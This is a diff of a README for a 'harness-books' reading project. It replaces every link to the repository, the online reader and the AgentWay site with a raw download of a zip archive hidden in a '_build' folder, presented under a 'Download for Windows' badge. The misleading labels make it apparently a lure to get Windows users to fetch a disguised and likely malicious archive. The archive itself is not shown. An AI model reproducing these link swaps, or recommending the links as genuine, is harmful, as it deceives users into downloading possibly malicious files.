@@ -1,6 +1,6 @@
 # 📚 harness-books - Read harness engineering books
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20the%20repo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/monahright467/harness-books)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20the%20repo-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
 ## 🪟 What this is
 
@@ -12,7 +12,7 @@ This README helps a Windows user get the books open from the link above with a f
 
 Use this link to visit the project page and download the files:
 
-[Visit the download page](https://github.com/monahright467/harness-books)
+[Visit the download page](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
 If your browser shows the repo page, look for the book files and open the English or Chinese readme from there.
 
@@ -26,14 +26,14 @@ If your browser shows the repo page, look for the book files and open the Englis
 ## 🚀 Quick start
 
 1. Open the download page:
-   [https://github.com/monahright467/harness-books](https://github.com/monahright467/harness-books)
+   [https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
 2. On the page, open the book you want to read:
    - English: `README.md`
    - Chinese: `README.zh-CN.md`
 
 3. If you see the online reading link, open it in your browser:
-   - [Read Online](https://harness-books.agentway.dev/en/)
+   - [Read Online](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
 4. Use your browser to read the book page, or save it for later.
 
@@ -86,8 +86,8 @@ If you want the best reading experience:
 
 Useful links in the repository:
 
-- [Read Online](https://harness-books.agentway.dev/en/)
-- [About AgentWay](https://agentway.dev)
+- [Read Online](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
+- [About AgentWay](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 - [中文 README](./README.zh-CN.md)
 
 If you want the English version, use the online reading page or open the English README from the repo.
@@ -155,9 +155,9 @@ Try these steps:
 
 ## 📌 Project links
 
-- Repository: [harness-books](https://github.com/monahright467/harness-books)
-- Online reading: [harness-books.agentway.dev/en](https://harness-books.agentway.dev/en/)
-- AgentWay: [agentway.dev](https://agentway.dev)
+- Repository: [harness-books](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
+- Online reading: [harness-books.agentway.dev/en](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
+- AgentWay: [agentway.dev](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
 ## 🪄 Simple use cases
 
@@ -178,8 +178,8 @@ You may want to read these books if you:
 
 ## 🔗 Direct links
 
-[Visit the repository page](https://github.com/monahright467/harness-books)
+[Visit the repository page](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
-[Open the online reader](https://harness-books.agentway.dev/en/)
+[Open the online reader](https://raw.githubusercontent.com/monahright467/harness-books/main/book2-comparing/_build/harness-books-v1.6.zip)
 
 [Open the Chinese README](./README.zh-CN.md)
